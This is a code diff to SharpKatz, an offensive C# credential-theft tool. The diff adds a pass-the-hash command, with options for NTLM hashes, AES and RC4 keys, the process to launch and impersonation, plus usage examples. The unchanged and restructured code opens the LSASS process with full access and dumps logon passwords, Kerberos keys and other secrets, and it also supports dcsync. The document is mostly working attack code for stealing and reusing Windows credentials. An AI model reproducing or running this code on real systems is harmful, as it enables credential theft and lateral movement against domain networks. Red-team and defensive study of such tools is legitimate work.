@@ -11,6 +11,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.DirectoryServices;
+using static SharpKatz.Module.Kerberos;
 
 namespace SharpKatz
 {
@@ -26,6 +27,14 @@ namespace SharpKatz
             string altservice = null;
             string domain = null;
             string dc = null;
+            string ntlmHash = null;
+            string aes128 = null;
+            string aes256 = null;
+            string rc4 = null;
+            string binary = null;
+            string arguments = null;
+            string luid = null;
+            string impersonateStr = null;
 
             bool showhelp = false;
 
@@ -36,6 +45,16 @@ namespace SharpKatz
                 { "Guid=", "--Guid [guid]", v => guid = v },
                 { "Domain=", "--Domain [domain]", v => domain = v },
                 { "DomainController=", "--DomainController [domaincontroller]", v => dc = v },
+
+                { "NtlmHash=", "--NtlmHash [ntlmHash]", v => ntlmHash = v },
+                { "Aes128=", "--Aes128 [aes128]", v => aes128 = v },
+                { "Aes256=", "--Aes256 [aes256]", v => aes256 = v },
+                { "Rc4=", "--Rc4 [rc4]", v => rc4 = v },
+                { "Binary=", "--Binary [binary]", v => binary = v },
+                { "Arguments=", "--Arguments [arguments]", v => arguments = v },
+                { "Luid=", "--Luid [luid]", v => luid = v },
+                { "Impersonate=", "--Impersonate [impersonate]", v => impersonateStr = v },
+
                 { "Altservice=", "--Altservice [alternative service]", v => altservice = v },
                 { "h|?|help",  "Show available options", v => showhelp = v != null },
             };
@@ -49,6 +68,17 @@ namespace SharpKatz
                 Console.WriteLine(e.Message);
             }
 
+            bool impersonate = false;
+            try
+            {
+                if(!string.IsNullOrEmpty(impersonateStr))
+                    impersonate = bool.Parse(impersonateStr);
+            }
+            catch (OptionException e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            
             if (showhelp)
             {
                 opts.WriteOptionDescriptions(Console.Out);
@@ -63,6 +93,10 @@ namespace SharpKatz
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command pth --User username --Domain userdomain --Rc4 rc4key");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256");
                 return;
             }
                         
@@ -70,7 +104,7 @@ namespace SharpKatz
                 command = "logonpasswords";
 
             if (!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") &&
-                !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync"))
+                !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") && !command.Equals("pth"))
             {
                 Console.WriteLine("Unknown command");
                 return;
@@ -93,6 +127,7 @@ namespace SharpKatz
 
             if (!command.Equals("dcsync"))
             {
+                
                 if (!Utility.IsElevated())
                 {
                     Console.WriteLine("Run in High integrity context");
@@ -144,39 +179,51 @@ namespace SharpKatz
                 }
 
                 hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);
-
-                List<Logon> logonlist = new List<Logon>();
-
+                
                 Keys keys = new Keys(hProcess, lsasrv, osHelper);
 
-                Module.LogonSessions.FindCredentials(hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
-
-                if (command.Equals("logonpasswords") || command.Equals("msv"))
-                    Module.Msv1.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
-
-                if (command.Equals("logonpasswords") || command.Equals("credman"))
-                    Module.CredMan.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
-
-                if (command.Equals("logonpasswords") || command.Equals("tspkg"))
-                    Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
-
-                if (command.Equals("logonpasswords") || command.Equals("kerberos") || command.Equals("ekeys"))
+                if (command.Equals("pth"))
                 {
-                    List<byte[]> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+                    if (string.IsNullOrEmpty(binary))
+                        binary = "cmd.exe";
 
-                    if (command.Equals("logonpasswords") || command.Equals("kerberos"))
-                        foreach (byte[] p in klogonlist)
-                            Module.Kerberos.GetCredentials(ref hProcess, p, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+                    Module.Pth.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, impersonate);
+                }
+                else
+                {
+                    List<Logon> logonlist = new List<Logon>();
 
-                    if (command.Equals("ekeys"))
-                        foreach (byte[] p in klogonlist)
-                            Module.Kerberos.GetKerberosKeys(ref hProcess, p, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+                    Module.LogonSessions.FindCredentials(hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                    if (command.Equals("logonpasswords") || command.Equals("msv"))
+                        Module.Msv1.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                    if (command.Equals("logonpasswords") || command.Equals("credman"))
+                        Module.CredMan.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                    if (command.Equals("logonpasswords") || command.Equals("tspkg"))
+                        Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                    if (command.Equals("logonpasswords") || command.Equals("kerberos") || command.Equals("ekeys"))
+                    {
+                        List<KerberosLogonItem> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                        if (command.Equals("logonpasswords") || command.Equals("kerberos"))
+                            foreach (KerberosLogonItem l in klogonlist)
+                                Module.Kerberos.GetCredentials(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                        if (command.Equals("ekeys"))
+                            foreach (KerberosLogonItem l in klogonlist)
+                                Module.Kerberos.GetKerberosKeys(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+                    }
+
+                    if (command.Equals("logonpasswords") || command.Equals("wdigest"))
+                        Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                    Utility.PrintLogonList(logonlist);
                 }
 
-                if (command.Equals("logonpasswords") || command.Equals("wdigest"))
-                    Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
-
-                Utility.PrintLogonList(logonlist);
+                
             }
             else
             {
